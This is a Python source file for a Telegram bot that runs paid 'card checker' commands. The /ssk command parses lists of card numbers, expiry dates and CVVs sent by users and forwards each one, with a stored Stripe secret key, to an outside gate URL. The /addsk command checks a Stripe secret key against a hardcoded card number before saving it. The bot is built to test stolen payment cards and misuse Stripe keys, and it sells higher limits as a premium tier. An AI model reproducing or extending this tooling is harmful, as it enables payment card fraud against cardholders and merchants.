from data.config import OWNER_LINK, PREFIX
from main import ok
from loader import dp, bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import concurrent.futures
import re

import requests
from aiogram import types
from database import *
import time


def sk(cc, mes, ano, cvv):
  try:
    sk_live = open("files/sk.txt", "r").read()
  except Exception as e:
    return e

  url = f"https://holyshiit.srfxdz.repl.co/gate/usd1.php?lista={cc}|{mes}|{ano}|{cvv}&sec={sk_live}"

  re = requests.get(url).text.strip()
  return f"<code>{cc}|{mes}|{ano}|{cvv}</code> <b>{re}</b>\n"


def sk_single_1(cc, mes, ano, cvv):
  try:
    sk_live = open("files/sk.txt", "r").read()

  except Exception as e:
    return e

  url = f"https://holyshiit.srfxdz.repl.co/gate/usd1.php?lista={cc}|{mes}|{ano}|{cvv}&sec={sk_live}"

  re = requests.get(url).text.strip()
  return f"<b>{re}</b>"


def sk_single(cc, mes, ano, cvv):

  while True:
    resp = sk_single_1(cc, mes, ano, cvv)
    if "SK IS AT RATE LIMIT" in resp:
      continue

    else:
      break

  return resp


@dp.message_handler(commands=['ssk'], commands_prefix=PREFIX)
async def mas2(message: types.Message):
  paid = open("files/group.txt").read().splitlines()
  if "supergroup" in message.chat.type or "group" in message.chat.type:
    if str(message.chat.id) in paid:
      pass
    else:
      await message.reply(
        "<b> This Chat IS Not Allowed Contact My master @Noir_Tempest_001  I Am Leaving :)</b>"
      )
      return await bot.leave_chat(message.chat.id)

  user_id = int(message.from_user.id)

  kk = await message.reply(
    f'{message.from_user.first_name} wait i am checking  your card')

  if check_Freeuser(user_id) == False:
    create_free(user_id)

  results = srffetch_timer(user_id)
  count_antispam = int(time.time()) - results
  status = ok(user_id)

  if 'FREE' in status and count_antispam < 30:

    after = 30 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
  """
    return await kk.edit_text(resp)

  elif 'PAID' in status and count_antispam < 5:

    after = 5 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
  """
    return await kk.edit_text(resp)

  elif 'ADMIN' in status and count_antispam < 5:

    after = 5 - count_antispam
    resp = f"""
{message.from_user.mention} ⚠️𝗧𝗥𝗬 𝗔𝗚𝗔𝗜𝗡 𝗔𝗙𝗧𝗘𝗥 {after} 𝗦𝗘𝗖𝗢𝗡𝗗𝗦
  """
    return await kk.edit_text(resp)

  await kk.edit_text("Wait gettting valid cards from your input.")
  all_cards = message.text.split('\n')
  keyboard_markup = types.InlineKeyboardMarkup(row_width=3)
  btns = types.InlineKeyboardButton("Take Premium", url=f"{OWNER_LINK}")
  keyboard_markup.row(btns)

  if len(all_cards) > 10:
    len_cards = len(all_cards)

    if "ADMIN" in status or "PAID" in status:
      if len(all_cards) > 50:
        await kk.edit_text(f"""found {len_cards}max cards allowed 5 cards """)
        pass
    else:
      await kk.edit_text(
        f"""<b> found-{len_cards} max cards allowed 5 cards \nTake Premium to check more then 10 </b>""",
        reply_markup=keyboard_markup,
        disable_web_page_preview=True)

  if "ADMIN" in status or "PAID" in status:
    all_cards = (all_cards[0:50])
  else:
    all_cards = (all_cards[0:5])

  cards = []
  for x in all_cards:
    input = re.findall(r"[0-9]+", x)
    if not input or len(input) < 3:
      continue
    if len(input) == 3:
      cc = input[0]
      if len(input[1]) == 3:
        mes = input[2][:2]
        ano = input[2][2:]
        cvv = input[1]
      else:
        mes = input[1][:2]
        ano = input[1][2:]
        cvv = input[2]
    else:
      cc = input[0]
      if len(input[1]) == 3:
        mes = input[2]
        ano = input[3]
        cvv = input[1]
      else:
        mes = input[1]
        ano = input[2]
        cvv = input[3]
      if len(mes) == 2 and (mes > '12' or mes < '01'):
        ano1 = mes
        mes = ano
        ano = ano1

    if (cc, mes, ano, cvv):
      if len(cc) < 15:
        pass

      else:

        cards.append([cc, mes, ano, cvv])
    else:
      continue

  len_cards = len(cards)
  if not len_cards:
    return await kk.edit_text("not found any cards from your input. thats bad."
                              )
  await kk.edit_text(
    "Found {} Cards from your input now i am checking them.".format(len_cards))
  text = f"""
ϟ Gateway-» <b>MassV3 Stripe 0.5$ sk Based </b>
ϟ Total cards : <b>{len_cards}</b>
<b>————Other Details————</b>
ϟ Proxy -» <b> Live ✅  </b>
ϟ Checked by -» <b> <a href="tg://user?id={message.from_user.id}">{message.from_user.first_name}</a></b>[{status}]
ϟ Bot by -» <b> <a href="tg://user?id=1226290399">U_8_M</a> </b>
ϟ Response-»\n
"""

  for inp in cards:

    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
      future = executor.submit(sk, inp[0], inp[1], inp[2], inp[3])
      return_value = future.result()
      text += return_value

      await kk.edit_text(text, disable_web_page_preview=True)
  text += "<i>All Cards Checked</i>"

  await kk.edit_text(f"{text}", disable_web_page_preview=True)


PREFIX = "!/."


@dp.message_handler(commands=['addsk'], commands_prefix=PREFIX)
async def infokfc(message: types.Message):
  query = message.text[len('/addsk '):]
  m = message.from_user.id
  kc = ok(m)

  if "ADMIN" in kc:
    user = query
    data = 'card[number]=4512238502012742&card[exp_month]=12&card[exp_year]=2024&card[cvc]=354'
    first = requests.post('https://api.stripe.com/v1/tokens',
                          data=data,
                          auth=(user, ' '))
    status = first.status_code
    if status == 200:
      with open("files/sk.txt", "w") as f:
        f.write(f"{query}")

        return await message.reply(f'''<b>✅sk Added Success Fully :)</b>''')
    else:
      if 'error' in first.json():
        if 'code' in first.json()['error']:
          r_res = first.json()['error']['code'].replace('_', ' ').strip()
        else:
          r_res = 'INVALID API KEY'
      else:
        r_res = 'INVALID API KEY'

      r_text = '❌' + r_res
      await message.reply(
        f"""{r_text} - <code>{user}</code> <b> Please ProviDe A Valid Api key To add </b>"""
      )

  else:
    button1 = InlineKeyboardButton(text="hide", callback_data="hide")
    keyboard_inline = InlineKeyboardMarkup().add(button1)
    return await message.reply("❌ you cannot use this command ❌",
                                reply_markup=keyboard_inline,
                                disable_web_page_preview=True)
